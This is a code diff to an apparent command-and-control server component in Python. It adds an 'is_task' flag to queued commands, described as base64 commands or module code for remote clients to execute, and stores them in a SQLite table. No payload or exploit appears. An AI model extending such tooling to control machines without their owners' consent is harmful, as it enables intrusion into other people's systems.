@@ -10,15 +10,17 @@ from threading import Lock
 class Command:
     """This class represents a command."""
 
-    def __init__(self, client_id, command, module_name=""):
+    def __init__(self, client_id, command, module_name="", is_task=False):
         """
         :param client_id The ID of the client which should execute this command.
         :param command The base64 command (or module code) to execute on the client.
         :param module_name The name of the module being executed.
+        :param is_task True if this module is a task.
         """
         self.id = client_id
         self.command = command
         self.module_name = module_name
+        self.is_task = is_task
 
     def __str__(self):
         """:return The JSON representation of this class."""
@@ -58,7 +60,8 @@ class ClientModel:
         self._cursor.execute("CREATE TABLE commands("
                              "client_id string, "
                              "command text, "
-                             "module_name text)")
+                             "module_name text, "
+                             "is_task boolean)")
         self._database.commit()
 
     def add_client(self, client):
@@ -101,8 +104,8 @@ class ClientModel:
         :type command Command
         """
         with self._lock:
-            self._cursor.execute("INSERT INTO commands VALUES(?,?,?)", (
-                command.id, command.command, command.module_name
+            self._cursor.execute("INSERT INTO commands VALUES(?,?,?,?)", (
+                command.id, command.command, command.module_name, command.is_task
             ))
             self._database.commit()
 
@@ -126,7 +129,7 @@ class ClientModel:
             response = self._cursor.execute("SELECT * FROM commands WHERE client_id = ?",
                                             (client_id,)).fetchone()
             if response:
-                command = Command(response[0], response[1], response[2])
+                command = Command(response[0], response[1], response[2], response[3])
                 return command
 
     def update_client(self, client_id, path, last_online):
